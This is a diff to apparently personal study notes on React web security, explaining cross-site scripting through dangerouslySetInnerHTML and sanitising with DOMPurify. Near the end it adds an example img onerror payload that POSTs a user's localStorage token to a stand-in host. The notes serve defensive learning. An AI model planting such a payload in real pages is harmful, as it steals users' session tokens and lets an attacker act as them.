@@ -723,10 +723,37 @@ const AppRoutes = () => {
   `<img src=??? onerror="alert('hi')" />`
   - when the image can't find the src, it errors and then runs the onerror function. this function could be malicious, stealing users data or performing actions on their behalf. 
 - in react there is no 'setInnerHTML' property, they've named it 'dangerouslySetInnerHTML' to warn the developer
+- We can use a library to sanitise, `npm i dompurify`
 
-#### Carry out a cross-site scripting attack 
-#### Steal a JSON Web Token 
-#### Sanitize a Cross-Site Scripting Attack 
+````js
+import DOMPurify from 'dompurify';
+
+const formattedMessage = `
+  <h2> random message </h2>
+  <img src=??? onerror="alert('hi')" />
+`;
+
+function App() {
+  return (
+    <>
+      <h1>Messages from our users</h1>
+      <div
+        dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(formattedMessage) }} // we can use DOMPurify here
+      >
+    </>
+  )
+}
+````
+- in the above code, the onerror event just got stripped out. DOMPurify knows that it can cause issues and is commonly used in cross site scripting attacks.
+
+
+- a better example of a XSS, if the user fills out their bio and that is set on dangerouslySetInnerHTML:
+````js
+<img src=?? onerror="fetch('https://dodgewebsite.com', {
+  { method: 'POST', body: localStorage.getItem('token')}
+})" />
+````
+- this would send the token to a listening server, then they can start making requests against our users. 
 
 ### Switching to Cookies 
 #### How Cookies Work 
